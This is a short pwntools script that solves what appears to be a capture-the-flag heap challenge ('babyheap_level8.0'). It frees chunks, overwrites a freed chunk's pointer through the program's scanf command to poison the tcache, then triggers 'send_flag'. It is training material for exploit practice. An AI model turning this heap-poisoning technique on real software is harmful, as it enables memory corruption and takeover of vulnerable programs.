from pwn import *
r = process("/challenge/babyheap_level8.0")
base_addr = 0x00420000
calc_offset1 = base_addr + 9983

#calc_offset2 = calc_offset1 + 8
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
for b in range(0,2):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.read()
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(calc_offset1))
for c in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(c).encode())
        r.sendline(b"32")

r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(b"hellohellohellohellohellohellohe")
r.sendline(b"send_flag")
r.sendline(b"ellohellohellohellohe")
r.interactive()
